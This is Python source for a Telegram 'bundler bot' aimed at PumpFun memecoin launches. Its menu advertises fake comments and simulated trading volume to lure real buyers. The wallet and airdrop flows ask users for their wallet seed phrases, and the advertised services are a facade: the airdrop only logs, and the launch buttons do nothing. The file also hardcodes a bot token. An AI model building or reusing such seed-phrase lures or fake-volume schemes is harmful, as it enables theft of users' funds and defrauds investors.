"""
ProTools Bundler Bot (Personalized & Validated)
==============================================
- Personalized Welcome: Greets user by First Name.
- Validation: 12/24 word phrase check + SOL address regex.
- Logs: Displays last 8 activities from DB.
- Support: Email integration in Feedback.
- Help: Displays custom image + "Coin Launch Preparation" steps.
"""

import logging
import os
import sqlite3
import re
from datetime import datetime
from threading import Thread

from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ─── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN  = os.getenv("BOT_TOKEN", "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00")
PORT       = int(os.getenv("PORT", 8000))
# The help image link from your uploaded assets
HELP_IMG   = "https://shared-assets.adobe.com/link/8d188cc8-0ff6-46ca-98e9-b2ac59de9da5"

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ─── Validation Helpers ────────────────────────────────────────────────────────

def is_valid_phrase(text: str) -> bool:
    """Checks if the phrase has exactly 12 or 24 words."""
    words = text.strip().split()
    return len(words) in (12, 24)

def is_valid_sol_address(address: str) -> bool:
    """Basic Base58 Solana address regex check (32-44 chars)."""
    return bool(re.match(r"^[1-9A-HJ-NP-Za-km-z]{32,44}$", address.strip()))

# ─── Conversation States ────────────────────────────────────────────────────────
(
    WALLET_PHRASE,
    AIRDROP_PHRASE,
    AIRDROP_RECIPIENT,
    AIRDROP_AMOUNT,
    AIRDROP_CONFIRM,
    FEEDBACK_TEXT,
) = range(6)

# ─── Database ───────────────────────────────────────────────────────────────────
DB_PATH = "protools.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, address TEXT, created_at TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, detail TEXT, timestamp TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS feedback (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, message TEXT, timestamp TEXT)")
    conn.commit()
    conn.close()

def log_action(user_id: int, action: str, detail: str = ""):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO logs (user_id, action, detail, timestamp) VALUES (?, ?, ?, ?)",
              (user_id, action, detail, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

def get_saved_address(user_id: int):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT address FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def save_address(user_id: int, username: str, address: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, username, address, created_at) VALUES (?, ?, ?, ?)",
              (user_id, username, address, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

# ─── Keyboards ─────────────────────────────────────────────────────────────────

MAIN_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🚀 Launch Coin",  callback_data="launch_coin"),
        InlineKeyboardButton("📊 Transactions", callback_data="transactions"),
    ],
    [
        InlineKeyboardButton("🎁 Airdrop",      callback_data="airdrop"),
        InlineKeyboardButton("🔑 Wallet",       callback_data="wallet"),
    ],
    [
        InlineKeyboardButton("📋 Logs",         callback_data="logs"),
        InlineKeyboardButton("❓ Help",          callback_data="help"),
    ],
    [InlineKeyboardButton("💬 Feedback",        callback_data="feedback")],
])

CANCEL_KB = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
CONFIRM_KB = InlineKeyboardMarkup([[
    InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"),
    InlineKeyboardButton("❌ Cancel",  callback_data="cancel"),
]])
BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])

# ─── Personalized Welcome Message ─────────────────────────────────────────────

def get_welcome_text(user_name: str) -> str:
    return (
        f"Welcome, *{user_name}* To ProTools Bundler Bot \- The Best Degen Tool For Launching On PumpFun\!\n\n"
        "Prepare to dominate the game with precision, speed, and stealth\. Here's what's in your arsenal:\n\n"
        "1\. *Intelligent Auto\-Bundling* \- Up to 25 wallets with sniper protection built right in\. Fire with confidence\! 🎯\n\n"
        "2\. 💬 *Fake Comments Generator* \- Create the illusion of a buzzing community\. Engage your audience before they even exist\! 🎭\n\n"
        "3\. 📊 *Volume Bot Assistant* \- Simulate juicy trading activity to attract real degens like bees to honey 🍯✅\n\n"
        "4\. 🎁 *Airdrop Management* \- Seamlessly handle and distribute airdrops like airdrop royalty 👑\n\n"
        "5\. 🕵️ *Transaction Tracker & More* \- Stay ten steps ahead with real\-time tracking of every movement on\-chain 🔍⚙️\n\n"
        "ProTools is more than a tool \- it's your edge in the degen arena\. Let the games begin\! 🧬🔥\n\n"
        "Choose an option below:"
    )

# ─── Handlers ──────────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name or "Degen"
    log_action(update.effective_user.id, "START")
    await update.message.reply_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_name = update.effective_user.first_name or "Degen"
    context.user_data.clear()
    await query.edit_message_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)

# ─── WALLET ────────────────────────────────────────────────────────────────────

async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    saved = get_saved_address(update.effective_user.id)
    text = f"🔑 *Your Wallet*\n\n`{saved}`\n\n_Status: Active_" if saved else "🔑 *Wallet*\n\nNo wallet linked yet\. Import your phrase to start\."
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Re-import" if saved else "➕ Import Phrase", callback_data="wallet_import")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]
    ])
    await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=kb)

async def wallet_import_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text(
        "🔑 *Import Wallet*\n\nSend your *seed phrase* \(12 or 24 words\)\:\n\n⚠️ _Deleted immediately for security\._", 
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB
    )
    return WALLET_PHRASE

async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phrase = update.message.text.strip()
    try: await update.message.delete()
    except: pass

    if not is_valid_phrase(phrase):
        await update.effective_chat.send_message("❌ *Invalid Phrase*\. Must be 12 or 24 words\. Try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
        return WALLET_PHRASE

    save_address(update.effective_user.id, update.effective_user.username or "", f"Verified_{len(phrase.split())}_Words")
    log_action(update.effective_user.id, "WALLET_LINKED", f"{len(phrase.split())} words")
    await update.effective_chat.send_message("✅ *Wallet Linked Successfully\!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
    return ConversationHandler.END

# ─── AIRDROP ───────────────────────────────────────────────────────────────────

async def airdrop_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("🎁 *Airdrop Step 1* — Send your *seed phrase*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return AIRDROP_PHRASE

async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phrase = update.message.text.strip()
    try: await update.message.delete()
    except: pass
    if not is_valid_phrase(phrase):
        await update.effective_chat.send_message("❌ *Invalid phrase length*\. Must be 12 or 24 words:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
        return AIRDROP_PHRASE
    await update.effective_chat.send_message("Step 2 — Enter the *recipient SOL address*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return AIRDROP_RECIPIENT

async def airdrop_recipient_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    address = update.message.text.strip()
    if not is_valid_sol_address(address):
        await update.message.reply_text("❌ *Invalid Solana Address*\. Please try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
        return AIRDROP_RECIPIENT
    context.user_data["airdrop_recipient"] = address
    await update.message.reply_text("Step 3 — Enter *amount in SOL*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return AIRDROP_AMOUNT

async def airdrop_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    amount = update.message.text.strip()
    try: float(amount)
    except: 
        await update.message.reply_text("❌ Enter a numeric amount:", reply_markup=CANCEL_KB)
        return AIRDROP_AMOUNT
    context.user_data["airdrop_amount"] = amount
    await update.message.reply_text(
        f"🎁 *Confirm Airdrop*\n\n*Recipient:* `{context.user_data['airdrop_recipient']}`\n*Amount:* `{amount} SOL`", 
        parse_mode="MarkdownV2", reply_markup=CONFIRM_KB
    )
    return AIRDROP_CONFIRM

async def airdrop_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_action(update.effective_user.id, "AIRDROP_QUEUED", f"{context.user_data['airdrop_amount']} SOL")
    await update.callback_query.edit_message_text("✅ *Airdrop Request Queued\!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
    return ConversationHandler.END

# ─── LOGS, HELP, FEEDBACK ─────────────────────────────────────────────────────

async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT action, detail, timestamp FROM logs WHERE user_id = ? ORDER BY id DESC LIMIT 8", (update.effective_user.id,))
    rows = c.fetchall()
    conn.close()
    
    if rows:
        lines = ["📋 *Recent Activity Logs*\n"]
        for r in rows:
            clean_ts = r[2][5:16].replace("T", " ")
            lines.append(f"• `{r[0]}` — {r[1]} \n  _{clean_ts}_")
        text = "\n".join(lines)
    else:
        text = "📋 *Logs*\n\nNo activity found\."
    
    await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=BACK_KB)

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    help_text = (
        "❓ *Coin Launch Preparation Steps*\n\n"
        "1\. 🚀 Enter token name \(1\-50 characters\)\n"
        "2\. 🏷 Enter token symbol \(2\-25 characters\)\n"
        "3\. 🖼 Upload token image\n"
        "4\. 👛 Select wallet bundle \(5, 10, 15, or 25\)\n"
        "5\. 📝 Enter token description \(max 500 characters\)\n"
        "6\. 🔗 Add social links \(Telegram, X, Website\) or skip\n"
        "7\. ✅ Confirm details\n"
        "8\. 🔑 Connect wallet to proceed"
    )
    try:
        await query.message.reply_photo(photo=HELP_IMG, caption=help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)
        await query.message.delete()
    except Exception as e:
        logger.error(f"Help image failed: {e}")
        await query.edit_message_text(help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)

async def feedback_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text(
        "💬 *Support*\n\nSend a message below or email directly at:\n`ProToolsBundlerBot@gmail.com`", 
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB
    )
    return FEEDBACK_TEXT

async def feedback_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_action(update.effective_user.id, "FEEDBACK", update.message.text[:30])
    await update.message.reply_text("✅ *Feedback Received\!* Thank you\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("❌ *Operation Cancelled\.*", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
    return ConversationHandler.END

# ─── Boilerplate & Server ──────────────────────────────────────────────────────

health_app = Flask(__name__)
@health_app.route("/")
def health(): return "OK", 200
def run_health(): health_app.run(host="0.0.0.0", port=PORT)

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    
    # Wallet Conv
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(wallet_import_prompt, pattern="^wallet_import$")],
        states={WALLET_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_phrase_received)]},
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))
    
    # Airdrop Conv
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(airdrop_entry, pattern="^airdrop$")],
        states={
            AIRDROP_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_phrase_received)],
            AIRDROP_RECIPIENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_recipient_received)],
            AIRDROP_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_amount_received)],
            AIRDROP_CONFIRM: [CallbackQueryHandler(airdrop_confirm, pattern="^confirm_yes$")],
        },
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))
    
    # Feedback Conv
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(feedback_start, pattern="^feedback$")],
        states={FEEDBACK_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, feedback_save)]},
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))

    # General Callbacks
    app.add_handler(CallbackQueryHandler(wallet_entry, pattern="^wallet$"))
    app.add_handler(CallbackQueryHandler(show_logs, pattern="^logs$"))
    app.add_handler(CallbackQueryHandler(show_help, pattern="^help$"))
    app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_to_menu$"))
    
    # Run Health Server and Bot
    Thread(target=run_health, daemon=True).start()
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__": main()
